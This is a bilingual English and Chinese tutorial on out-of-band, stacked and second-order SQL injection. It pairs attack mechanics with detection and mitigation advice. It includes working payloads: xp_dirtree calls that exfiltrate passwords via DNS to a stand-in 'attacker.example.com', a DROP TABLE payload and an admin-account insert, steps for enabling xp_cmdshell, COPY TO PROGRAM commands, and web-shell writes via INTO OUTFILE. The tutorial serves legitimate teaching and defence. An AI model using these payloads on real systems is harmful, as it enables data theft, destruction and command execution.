---
id: sqli-out-of-band-stacked-second-order
title_en: "SQL Injection, Part 4 — Out-of-Band, Stacked and Second-Order"
title_zh: "SQL 注入（四）：带外、堆叠与二阶注入"
summary_en: Three ways an injection is not where you are looking — the data leaves by another channel, the statement boundary is crossed, or the payload sits in the database until something later trusts it. This entry covers each mechanism, the real prerequisites, the paths from injection to command execution, and why second-order injection defeats input validation by design.
summary_zh: 三种"注入不在你正看的地方"的情况 —— 数据从另一条通道离开、语句的边界被跨过、或者载荷先待在数据库里直到后来有东西信任了它。这一篇讲各自的机制、真实前提、从注入通向命令执行的路径，以及为什么二阶注入在设计上就能击败输入校验。
tags: [web, sql-injection, out-of-band, stacked-queries, second-order, xp-cmdshell]
tools: [sqlmap, Burp Collaborator, tcpdump, mysql, sqlite3]
attck: [T1190, T1059]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Three ways the injection is somewhere else

Parts 2 and 3 assumed the injection and the answer are in the same request: you send a payload, and the same response tells you something. These three techniques break that assumption in three different directions.

| Technique | What is displaced | The question it answers |
|---|---|---|
| **Out-of-band** | The **direction** — data leaves instead of coming back | "I get no response at all, so how do I read anything?" |
| **Stacked queries** | The **boundary** — a second statement runs | "One `SELECT` is not enough; how do I change data or run commands?" |
| **Second-order** | The **time** — the payload is stored, then trusted later | "Input filtering is everywhere; how is it still injectable?" |

All three are worth understanding for the same reason: they are the cases that **ordinary testing misses**. A scanner that checks whether responses change will not see an out-of-band injection, will not test statement stacking, and cannot follow a payload through a database into a different feature six months later.

### Out-of-band injection

**The mechanism.** If nothing comes back, make the database go somewhere instead:

```sql
-- MSSQL: a UNC path makes the server resolve a hostname and open an SMB connection
EXEC master..xp_dirtree '\\attacker.example.com\share'
```

The database resolves `attacker.example.com` and connects. That connection is an outbound event **you can observe from outside** — and if you control the hostname, you can encode data into it:

```sql
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.example.com\a'
```

The password appears as a DNS label in a query to your authoritative nameserver. **One request, whole values, no response needed.**

#### The prerequisite is egress, and it is a real one

Out-of-band requires the database server to be able to make outbound network requests. That is common but not universal: a database in a hardened segment often has no route out, and that single fact removes this entire family. **This is why "the database cannot reach the internet" is a control worth verifying rather than assuming** — it shows up as a defence in the mitigation section, and as a blind spot when it is false.

The channels, in order of how often they work:

| Channel | Why it works well |
|---|---|
| **DNS** | Frequently allowed where HTTP is blocked, and rarely filtered to specific hostnames |
| **HTTP/HTTPS** | Direct, but more likely to be blocked and inspected |
| **SMB** | Specific to Windows targets, and it leaks an authentication attempt as a bonus (below) |

#### The techniques, by dialect

| Dialect | Primitive | Notes |
|---|---|---|
| **MSSQL** | `xp_dirtree`, `xp_fileexist`, `xp_subdirs` | Take a UNC path and resolve it. Need no special privilege beyond running extended procedures |
| **Oracle** | `utl_http.request`, `utl_inaddr.get_host_address`, `httpuritype` | `utl_inaddr` was usable without privileges before 11g |
| **MySQL** | `LOAD_FILE('\\\\host\\share')` | **Windows only** — on Linux this does not generate an outbound connection |
| **PostgreSQL** | `COPY ... TO PROGRAM`, `dblink`, `lo_import` | Mostly require superuser or an extension |
| **SQLite** | — | No network primitives; not applicable |

MySQL deserves the honest note: out-of-band on MySQL is **much more limited** than on MSSQL, and most guides overstate it. On Linux, `LOAD_FILE` will not make the server call out. The practical MySQL paths are file write (`INTO OUTFILE`, next section) and blind techniques, not DNS.

#### Receiving it

You need to see the DNS query or the HTTP request. The simplest reliable setup is to run an authoritative nameserver you control and watch its logs; the quickest local check is to watch for the traffic:

```bash
sudo tcpdump -i any -nn udp port 53            # DNS queries arriving
sudo tcpdump -i any -nn 'tcp port 80 or 445'   # HTTP and SMB attempts
```

Tools like `sqlmap` and Burp's Collaborator generate a unique hostname per test and tell you whether it was resolved, which is the convenient path. Doing it manually with `tcpdump` is worth once, because it makes the mechanism concrete: you are watching the database make a request it has no business making.

#### Two details that decide whether it works

**DNS name limits.** A label is limited to 63 characters and a full name to 253, so a long value has to be sent in pieces — one query per 50-ish characters, with the offset controlled by the payload. `SUBSTRING` plus a counter does it, or simply one query per row.

**The signal can be boolean too.** You do not have to carry data out. A DNS lookup that happens or does not happen is a perfectly good **one-bit oracle**, and it is available even when the application's response is completely uniform — which makes out-of-band a blind technique with a different channel, not a separate category:

```sql
-- MSSQL: the lookup fires only if the condition is true
EXEC master..xp_dirtree '\\' + CASE WHEN (SELECT TOP 1 1 FROM users WHERE name='admin')=1
                                    THEN 'hit.attacker.example.com' ELSE 'miss.attacker.example.com' END + '\a'
```

**And the SMB bonus worth knowing about.** A UNC path with a hostname does not just resolve DNS — it makes Windows **attempt SMB authentication**, which means the database server's machine account (or a service account) sends an NTLM authentication attempt to a host you control. Capturing that gives you a credential to relay or crack. It is a different vulnerability class stacked on top of the same primitive, and it is a reminder that "make the server contact me" can leak more than the data you asked for.

### Stacked queries

**The mechanism.** Most databases accept several statements separated by `;`:

```sql
SELECT * FROM items WHERE id = 1; DROP TABLE users-- -
```

If the client library passes the whole string to the server, the second statement executes. **That turns a read primitive into a write primitive** — and often into command execution.

#### The prerequisite is the client library, not the database

This trips people up constantly, because it is a property of the API in front of the database:

| Stack | Multi-statement? |
|---|---|
| PHP `mysqli_query` | **No** — one statement, extra ones rejected |
| PHP `mysqli_multi_query` | **Yes** |
| PHP PDO (MySQL) | **No by default** — `MYSQL_ATTR_MULTI_STATEMENTS` must be enabled |
| Python `sqlite3` `execute` | **No** |
| Python `sqlite3` `executescript` | **Yes** |
| Python `psycopg2` `execute` | **Yes** (PostgreSQL allows it) |
| MSSQL via most drivers | **Usually yes** |
| Oracle default interfaces | **No** — PL/SQL blocks instead |
| Java `Statement.execute` | Driver and database dependent |

```python
# the difference is entirely in the API, and it is worth seeing once
import sqlite3
db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE t(x)")

try:
    db.execute("INSERT INTO t VALUES (1); INSERT INTO t VALUES (2)")
except sqlite3.Warning as e:
    print('execute      : refused ->', e)

db.executescript("INSERT INTO t VALUES (3); INSERT INTO t VALUES (4)")
print('executescript:', db.execute('SELECT count(*) FROM t').fetchone()[0], 'rows')
```

**How to test whether stacking is available** on a target: send `; SELECT 1` and look for an error. Absence of an error is weak evidence — the query may have been truncated or the error suppressed. Better: use a **stacked conditional delay**, which works even when nothing is displayed:

```sql
1; IF(1=1) WAITFOR DELAY '0:0:5'-- -        -- MSSQL
1; SELECT IF(1=1, SLEEP(5), 0)-- -          -- MySQL
```

If the response is slow, stacking works — and you now have stacking *and* a time-based oracle, which means you can execute statements blindly.

#### What stacking buys you

| Capability | Example |
|---|---|
| Modify or delete data | `; UPDATE users SET role='admin' WHERE name='me'-- -` |
| Create an account | `; INSERT INTO users(name,password,role) VALUES('x','hash','admin')-- -` |
| Read or write files | MySQL `INTO OUTFILE`, MSSQL `OPENROWSET` |
| **Command execution** | MSSQL `xp_cmdshell`, PostgreSQL `COPY ... TO PROGRAM` |
| Persistence in the database | Triggers, stored procedures, scheduled jobs |

#### The path from injection to command execution

This is the part that changes an assessment's severity, so it is worth knowing the shape on each platform.

**MSSQL.** `xp_cmdshell` runs an OS command. It is disabled by default since 2005 and requires `sysadmin` (or equivalent) to enable:

```sql
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE-- -
1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -
1; EXEC xp_cmdshell 'whoami'-- -
```

If the application's database account is `sysadmin` — which happens more often than it should — that is a direct path to a shell on the database host.

**MySQL.** Two paths, both privileged:

- **Write a file** with `SELECT ... INTO OUTFILE '/var/www/html/s.php'`, which requires the `FILE` privilege and a `secure_file_priv` setting that permits the location. Writing into a web root gives a shell.
- **Load a UDF** (`sys_exec`, `lib_mysqludf_sys`) where the plugin directory is writable and the account has `INSERT` on `mysql.func` — a well-known escalation, and one that `secure_file_priv` and least privilege both obstruct.

**PostgreSQL.** `COPY ... TO PROGRAM 'command'` requires superuser or a granted role, and runs as the `postgres` OS user.

```sql
1; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'-- -
```

The general lesson: **the injection primitive is a read; the severity comes from what else the database account can do.** Which is why least privilege is not a hygiene item but a severity control.

### Second-order injection

**The mechanism.** This is the one that defeats input validation on purpose. The payload is stored safely — often through a parameterised insert, which is genuinely safe — and then read back later and concatenated into another query.

```
1. Registration:  INSERT INTO users(name, ...) VALUES (?, ...)     <- parameterised, safe
                  name = "admin'-- -"
2. Storage:       the database now holds that literal string
3. Later feature: "SELECT * FROM logs WHERE owner = '" + row.name + "'"   <- concatenated
4. Injection:     SELECT * FROM logs WHERE owner = 'admin'-- -'
```

**Nothing on the input path was wrong.** The insert was parameterised correctly. The vulnerability is in a **different query, in a different feature, written by possibly a different person** — and it triggers because the stored value was treated as trustworthy.

That is the cleanest illustration of the trust boundary in this whole series. The developer's mental model was "user input is untrusted, so validate it at the boundary", and the value passed that boundary legitimately. What was never checked is that **data that came from a user is still user data after a round trip through the database**. The boundary being protected was the wrong one.

```python
import sqlite3

db = sqlite3.connect(':memory:')
db.executescript("CREATE TABLE users(id INTEGER, name TEXT); CREATE TABLE logs(owner TEXT, entry TEXT);")
db.execute("INSERT INTO logs VALUES ('admin', 'secret entry')")

# 1. registration: parameterised, and genuinely safe
payload = "admin'-- -"
db.execute("INSERT INTO users(name) VALUES (?)", (payload,))       # safe

# 2. later, a different feature reads the name back and concatenates it
name = db.execute("SELECT name FROM users").fetchone()[0]
query = "SELECT entry FROM logs WHERE owner = '" + name + "'"      # vulnerable
print('query   :', query)
print('rows    :', db.execute(query).fetchall())                   # leaks another user's rows
```

Run that and the second query returns `admin`'s log entry, even though the value was never filtered — because **it never needed filtering at the insertion point, and there is no insertion-point defence that would have helped.** The only fix is that the second query must be parameterised too.

#### Where it hides

| Location | Why it is missed |
|---|---|
| **Usernames** | Register safely, then a dozen features concatenate the name |
| **Email addresses, filenames, notes** | Same shape, less obviously dangerous |
| **Values read from the database and used as identifiers** | `SELECT * FROM <stored table name>` |
| **Audit and log systems** | They record user strings, then query them |
| **Queued messages** | The producer validated; the consumer trusts the queue |
| **Caches and session stores** | Data leaves the request boundary and comes back "internal" |

#### How to look for it

Testing for second-order injection means **following the data**, which is slower than fuzzing:

1. Submit a distinctive, syntactically visible value — `x'||'y`, `admin'-- -`, `1'AND'1` — into every field that gets stored.
2. Visit every feature that could display, search, export or act on that value.
3. Watch for **database errors on pages that have nothing to do with the field you filled in**. That is the signature: an error in a query you did not directly influence.

**A structural observation that matters for defenders**: input validation at the boundary **cannot** prevent second-order injection, by construction. Every control that inspects the request is looking at the wrong layer. The only controls that work are (a) parameterising every query, including the ones that only ever handle "our own" data, and (b) reviewing data flow rather than input points.

### The three, side by side

| Technique | Displaced | Trust boundary that was wrong | Primary defence |
|---|---|---|---|
| **Out-of-band** | Direction | The database is assumed unable to reach out | Egress filtering; no network primitives for the DB account |
| **Stacked** | Statement boundary | The API is assumed to accept only one statement | Disable multi-statements; least privilege |
| **Second-order** | Time | Stored data is assumed trustworthy | Parameterise every query, not just the ones near user input |

### Detection and mitigation

- **Out-of-band: watch the database server's network behaviour.** A database host making DNS queries or HTTP requests to the internet is abnormal in almost every environment, and it is the strongest single signal for this technique. Log DNS from the database segment, alert on queries to newly-seen or random-looking domains, and **block egress by default** rather than relying on detection. Also watch for SMB outbound, which is both this technique and a credential-relay attempt.
- **Out-of-band, database side: remove the primitives.** `xp_cmdshell` disabled, `xp_dirtree` and friends not needed by the application, `utl_http` and `utl_inaddr` not granted, `COPY ... TO PROGRAM` restricted to superusers. Each one closes a specific technique rather than the class, and least privilege closes several at once.
- **Stacked: turn off multi-statements in the client library**, which is a configuration line and not a code change: `mysqli_query` instead of `mysqli_multi_query`, PDO's `MYSQL_ATTR_MULTI_STATEMENTS` left at its default, `execute` rather than `executescript`. Then verify it, because defaults differ between drivers and versions.
- **Stacked: alert on statement shapes the application never issues.** `CREATE USER`, `DROP`, `GRANT`, `xp_cmdshell`, `INTO OUTFILE`, `COPY ... TO PROGRAM` in a query log, executed by an application account. Any of these is either a finding or an incident, and none should be routine.
- **Second-order: audit the queries, not the inputs.** A query log with parameters is the only thing that shows this clearly, because both the write and the read are legitimate in isolation — what is anomalous is a **stored value appearing inside a query's structure**. Look for quotes, comment markers and SQL keywords inside parameter values, and for syntax errors on queries whose text is fixed in the source.
- **Second-order: accept that boundary validation cannot see it.** If your architecture assumes "validate at the edge and trust everything inside", second-order injection is not a gap in that model, it is a counterexample to it. Parameterise every query — including internal ones — and treat "this data came from our own database" as not a trust argument.
- **And in all three cases the actual fix is the same one as part 1.** None of these is a new vulnerability class; they are the same concatenation viewed from three different angles. Parameterising removes all three, and every control above only bounds the damage or improves the odds of noticing.

<!-- lang:zh -->
### 三种"注入在别处"的情况

第二、三篇都假定注入和答案在同一个请求里：你发一个载荷，同一个响应告诉你点什么。这三种技术从三个不同方向打破了那个假定。

| 技术 | 被挪开的是什么 | 它回答的问题 |
|---|---|---|
| **带外** | **方向** —— 数据是离开，而不是回来 | "我完全拿不到响应，那怎么读东西？" |
| **堆叠查询** | **边界** —— 第二条语句被执行 | "一条 `SELECT` 不够；怎么改数据、怎么执行命令？" |
| **二阶** | **时间** —— 载荷先被存下，后来才被信任 | "到处都在做输入过滤，怎么还能注入？" |

三者都值得理解，理由相同：它们正是**常规测试会漏掉**的情况。一个检查"响应有没有变化"的扫描器看不到带外注入、不会去测堆叠，也没有办法追踪一个载荷穿过数据库、在六个月后的另一个功能里发作。

### 带外注入

**机制。** 如果没有东西回来，就让数据库**出去**：

```sql
-- MSSQL：一个 UNC 路径会让服务器解析主机名并建立 SMB 连接
EXEC master..xp_dirtree '\\attacker.example.com\share'
```

数据库会解析 `attacker.example.com` 并连接。那条连接是一个你能**从外部观察到**的出站事件 —— 而如果那个主机名由你控制，你就可以把数据编码进去：

```sql
EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker.example.com\a'
```

口令就作为 DNS 查询里的一个标签，出现在你那台权威域名服务器的查询日志里。**一次请求，整段值，不需要任何响应。**

#### 前提是出网能力，而它是个真前提

带外要求数据库服务器能做**出站**网络请求。这很常见，但不是普遍成立：处在加固网段里的数据库往往没有出网路由，而仅此一条事实就移除了整个技术家族。**这就是"数据库到不了互联网"是一个值得验证、而不是假定的控制点的原因** —— 它在缓解那节里是一项防御，而在它不成立的时候，就是一个盲区。

通道，按它们生效的频率排序：

| 通道 | 为什么好用 |
|---|---|
| **DNS** | 在 HTTP 被挡的地方常常仍然允许，而且很少按主机名过滤 |
| **HTTP/HTTPS** | 直接，但更可能被阻断和检查 |
| **SMB** | Windows 目标特有，而且顺带泄漏一次认证尝试（见下） |

#### 各库的原语

| 方言 | 原语 | 说明 |
|---|---|---|
| **MSSQL** | `xp_dirtree`、`xp_fileexist`、`xp_subdirs` | 接受 UNC 路径并解析它。除了能跑扩展存储过程之外不需要特别权限 |
| **Oracle** | `utl_http.request`、`utl_inaddr.get_host_address`、`httpuritype` | `utl_inaddr` 在 11g 之前无需权限即可使用 |
| **MySQL** | `LOAD_FILE('\\\\host\\share')` | **仅 Windows** —— Linux 上这不会产生出站连接 |
| **PostgreSQL** | `COPY ... TO PROGRAM`、`dblink`、`lo_import` | 多数需要超级用户或扩展 |
| **SQLite** | —— | 没有网络原语；不适用 |

MySQL 值得一句诚实的说明：MySQL 上的带外比 MSSQL **受限得多**，而很多资料把它讲得过好了。在 Linux 上，`LOAD_FILE` 不会让服务器向外发起连接。MySQL 实用的路径是写文件（`INTO OUTFILE`，见下一节）和盲注技术，而不是 DNS。

#### 怎么接收

你需要看到那次 DNS 查询或 HTTP 请求。最简可靠的布置是自己跑一台权威域名服务器并看它的日志；最快捷的本地检查是盯着流量：

```bash
sudo tcpdump -i any -nn udp port 53            # 到达的 DNS 查询
sudo tcpdump -i any -nn 'tcp port 80 or 445'   # HTTP 与 SMB 尝试
```

`sqlmap` 和 Burp 的 Collaborator 会为每次测试生成一个唯一主机名，并告诉你它有没有被解析，这是省事的路。而手工用 `tcpdump` 做一次是值得的，因为它让机制变得具体：**你在看着数据库发出一个它没有任何理由发出的请求。**

#### 两个决定成败的细节

**DNS 名字的长度限制。** 一个标签最多 63 个字符、完整名字最多 253，所以长值得分片发送 —— 每 50 来个字符一次查询，偏移量由载荷控制。`SUBSTRING` 加一个计数器就行，或者干脆一行一次查询。

**这个信号也可以是布尔的。** 你不一定非要把数据带出去。一次"发生了"或"没发生"的 DNS 查询就是一个完全合格的**一比特预言机**，而且即使应用的响应完全一致它也可用 —— 这让带外成了**换了通道的盲注技术**，而不是一个独立类别：

```sql
-- MSSQL：只有条件为真时才会发起这次解析
EXEC master..xp_dirtree '\\' + CASE WHEN (SELECT TOP 1 1 FROM users WHERE name='admin')=1
                                    THEN 'hit.attacker.example.com' ELSE 'miss.attacker.example.com' END + '\a'
```

**还有那个值得知道的 SMB 附带效果。** 带主机名的 UNC 路径不只是解析 DNS —— 它会让 Windows **尝试 SMB 认证**，也就是说数据库服务器的机器账号（或某个服务账号）会向你控制的机器发一次 NTLM 认证尝试。抓到这个，你就得到了一份可用于中继或破解的凭据。这是叠在同一个原语之上的另一个漏洞类别，也提醒了一件事："让服务器来联系我"可能泄漏的，比你要的那点数据更多。

### 堆叠查询

**机制。** 多数数据库接受以 `;` 分隔的多条语句：

```sql
SELECT * FROM items WHERE id = 1; DROP TABLE users-- -
```

如果客户端库把整串都交给服务器，第二条语句就会执行。**这就把"读"这个原语变成了"写"** —— 而且常常变成命令执行。

#### 前提是客户端库，不是数据库

这一点不断让人踩坑，因为它是数据库前面那个 API 的性质：

| 技术栈 | 支持多语句吗 |
|---|---|
| PHP `mysqli_query` | **不** —— 一条语句，多的被拒 |
| PHP `mysqli_multi_query` | **支持** |
| PHP PDO（MySQL） | **默认不支持** —— 需要打开 `MYSQL_ATTR_MULTI_STATEMENTS` |
| Python `sqlite3` 的 `execute` | **不支持** |
| Python `sqlite3` 的 `executescript` | **支持** |
| Python `psycopg2` 的 `execute` | **支持**（PostgreSQL 允许） |
| 多数驱动下的 MSSQL | **通常支持** |
| Oracle 默认接口 | **不支持** —— 改用 PL/SQL 块 |
| Java `Statement.execute` | 取决于驱动和数据库 |

```python
# 差别完全在 API 上，值得亲眼看一次
import sqlite3
db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE t(x)")

try:
    db.execute("INSERT INTO t VALUES (1); INSERT INTO t VALUES (2)")
except sqlite3.Warning as e:
    print('execute      : 被拒绝 ->', e)

db.executescript("INSERT INTO t VALUES (3); INSERT INTO t VALUES (4)")
print('executescript:', db.execute('SELECT count(*) FROM t').fetchone()[0], '行')
```

**怎么测目标上能不能堆叠**：发 `; SELECT 1` 看有没有报错。没有报错是弱证据 —— 查询可能被截断了，或者错误被屏蔽了。更好的办法是用**堆叠的条件延迟**，它在什么都不显示的时候也管用：

```sql
1; IF(1=1) WAITFOR DELAY '0:0:5'-- -        -- MSSQL
1; SELECT IF(1=1, SLEEP(5), 0)-- -          -- MySQL
```

如果响应慢了，堆叠可用 —— 而且你现在同时拥有堆叠**和**一个时间盲注预言机，也就是说你可以**盲着执行语句**。

#### 堆叠能买到什么

| 能力 | 例子 |
|---|---|
| 修改或删除数据 | `; UPDATE users SET role='admin' WHERE name='me'-- -` |
| 创建账号 | `; INSERT INTO users(name,password,role) VALUES('x','hash','admin')-- -` |
| 读写文件 | MySQL 的 `INTO OUTFILE`、MSSQL 的 `OPENROWSET` |
| **命令执行** | MSSQL 的 `xp_cmdshell`、PostgreSQL 的 `COPY ... TO PROGRAM` |
| 在数据库里持久化 | 触发器、存储过程、定时任务 |

#### 从注入到命令执行的路径

这是改变一次评估严重程度的部分，所以各平台上的形状都值得知道。

**MSSQL。** `xp_cmdshell` 直接跑操作系统命令。2005 起它默认禁用，且需要 `sysadmin`（或等价权限）才能启用：

```sql
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE-- -
1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -
1; EXEC xp_cmdshell 'whoami'-- -
```

如果应用的数据库账号是 `sysadmin`（这种事发生的频率比它该有的高），那就是一条通向数据库主机 shell 的直路。

**MySQL。** 两条路，都需要权限：

- **写文件**：`SELECT ... INTO OUTFILE '/var/www/html/s.php'`，需要 `FILE` 权限、以及允许该位置的 `secure_file_priv` 设置。往 web 根目录里写，就得到一个 shell。
- **加载 UDF**（`sys_exec`、`lib_mysqludf_sys`），前提是插件目录可写、且账号对 `mysql.func` 有 `INSERT` —— 一个众所周知的提权路径，而 `secure_file_priv` 和最小权限都能阻挠它。

**PostgreSQL。** `COPY ... TO PROGRAM 'command'` 需要超级用户或被授予的角色，并以 `postgres` 这个操作系统用户运行。

```sql
1; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'-- -
```

通用教训是：**注入这个原语是"读"，而严重程度来自这个数据库账号还能做什么。** 这就是为什么最小权限不是一条卫生条款，而是一项严重程度控制。

### 二阶注入

**机制。** 这就是那个**在设计上就能击败输入校验**的东西。载荷被安全地存下来 —— 常常是通过参数化的插入，而那确实是安全的 —— 然后后来被读回来、拼进另一条查询。

```
1. 注册：      INSERT INTO users(name, ...) VALUES (?, ...)     <- 参数化，安全
               name = "admin'-- -"
2. 存储：      数据库现在存着那个字面字符串
3. 后来的功能："SELECT * FROM logs WHERE owner = '" + row.name + "'"   <- 拼接
4. 注入：      SELECT * FROM logs WHERE owner = 'admin'-- -'
```

**输入路径上没有任何东西是错的。** 那次插入被正确地参数化了。漏洞在**另一条查询、另一个功能，可能是另一个人写的** —— 它之所以触发，是因为那个存下来的值被当成了可信的。

这是整个系列里对**信任边界**最干净的例证。开发者的心智模型是"用户输入不可信，所以在边界上校验它"，而那个值**合法地通过了那个边界**。从来没有被检查过的是：**来自用户的数据，在数据库里走了一个来回之后，仍然是用户数据。** 被保护的是错误的边界。

```python
import sqlite3

db = sqlite3.connect(':memory:')
db.executescript("CREATE TABLE users(id INTEGER, name TEXT); CREATE TABLE logs(owner TEXT, entry TEXT);")
db.execute("INSERT INTO logs VALUES ('admin', 'secret entry')")

# 1. 注册：参数化，而且确实安全
payload = "admin'-- -"
db.execute("INSERT INTO users(name) VALUES (?)", (payload,))       # 安全

# 2. 后来，另一个功能把名字读回来并拼接它
name = db.execute("SELECT name FROM users").fetchone()[0]
query = "SELECT entry FROM logs WHERE owner = '" + name + "'"      # 有漏洞
print('拼出的查询:', query)
print('返回的行  :', db.execute(query).fetchall())                  # 泄漏了另一个用户的行
```

跑一下这段，第二条查询会返回 `admin` 的日志条目，尽管那个值从未被过滤过 —— 因为**它在插入点上根本不需要过滤，而且没有任何插入点上的防御能起作用**。唯一的修法是第二条查询也必须参数化。

#### 它藏在哪儿

| 位置 | 为什么被漏掉 |
|---|---|
| **用户名** | 注册时安全，然后十几个功能都拼接这个名字 |
| **邮箱、文件名、备注** | 同样的形状，看起来没那么危险 |
| **从数据库读出来当标识符用的值** | `SELECT * FROM <存下来的表名>` |
| **审计与日志系统** | 它们记录用户字符串，然后再查询它们 |
| **队列消息** | 生产方校验过了；消费方信任队列 |
| **缓存与会话存储** | 数据离开请求边界，再回来时就"是内部的了" |

#### 怎么找它

测二阶注入意味着**跟着数据走**，这比模糊测试慢：

1. 往每一个会被存储的字段里提交一个**独特的、语法上可见的**值 —— `x'||'y`、`admin'-- -`、`1'AND'1`。
2. 访问每一个可能展示、搜索、导出或处理那个值的功能。
3. 留意**那些和你填的字段毫无关系的页面上的数据库报错**。那就是特征：**一条你并没有直接影响的查询报错了。**

**一个对防守方要紧的结构性观察**：边界上的输入校验**在构造上就不可能**防止二阶注入。每一个检查请求的控制，看的都是错误的层次。唯一管用的控制是：(a) **把每一条查询都参数化**，包括那些只处理"我们自己"的数据的；(b) 审查**数据流**而不是审查输入点。

### 三者并排

| 技术 | 被挪开的 | 出错的信任边界 | 主要防御 |
|---|---|---|---|
| **带外** | 方向 | 假定了数据库出不去 | 出站过滤；数据库账号没有网络原语 |
| **堆叠** | 语句边界 | 假定了 API 只接受一条语句 | 禁用多语句；最小权限 |
| **二阶** | 时间 | 假定了存下来的数据可信 | 把每一条查询都参数化，不只是靠近用户输入的那些 |

### 检测与缓解

- **带外：盯数据库服务器的网络行为。** 一台数据库主机对互联网做 DNS 查询或 HTTP 请求，在几乎任何环境里都不正常，而这是针对这个技术最强的单一信号。把数据库网段的 DNS 记下来，对新出现的或看起来随机的域名告警，并且**默认阻断出站**而不是依赖检测。也要盯 SMB 出站 —— 它既是这个技术，也是一次凭据中继尝试。
- **带外的数据库侧：把原语删掉。** `xp_cmdshell` 禁用；`xp_dirtree` 这类扩展过程应用不需要就别开；`utl_http`、`utl_inaddr` 不授权；`COPY ... TO PROGRAM` 限制为超级用户。每一条关掉的是一个具体技术而不是整个类别，而最小权限一次关掉好几条。
- **堆叠：在客户端库里关掉多语句**，这是一行配置而不是改代码：用 `mysqli_query` 而不是 `mysqli_multi_query`，PDO 的 `MYSQL_ATTR_MULTI_STATEMENTS` 保持默认，用 `execute` 而不是 `executescript`。然后**去验证它**，因为各驱动和版本的默认值不一样。
- **堆叠：对应用从不发出的语句形状告警。** `CREATE USER`、`DROP`、`GRANT`、`xp_cmdshell`、`INTO OUTFILE`、`COPY ... TO PROGRAM` 出现在查询日志里、由应用账号执行 —— 这些要么是一条发现项，要么是一起事件，没有一个是例行操作。
- **二阶：审计查询，而不是审计输入。** 带参数的查询日志是唯一能清楚显示它的东西，因为写入和读取单独看都合法 —— 异常的是**一个存下来的值出现在某条查询的结构里**。去找参数值里的引号、注释符和 SQL 关键字，以及那些源码里文本固定的查询报出的语法错误。
- **二阶：接受"边界校验看不见它"这件事。** 如果你的架构假定"在边缘校验、内部一切可信"，那么二阶注入不是这个模型的缺口，而是它的**反例**。把每一条查询都参数化 —— 包括内部的那些 —— 并且把"这份数据来自我们自己的数据库"当作不是一个信任论据。
- **而三种情况的真正修法都和第一篇一样。** 它们都不是新的漏洞类别；它们是同一个"拼接"从三个不同角度看到的样子。**参数化同时移除这三者**，而上面每一项控制只是限制损害、或者提高被发现的概率。
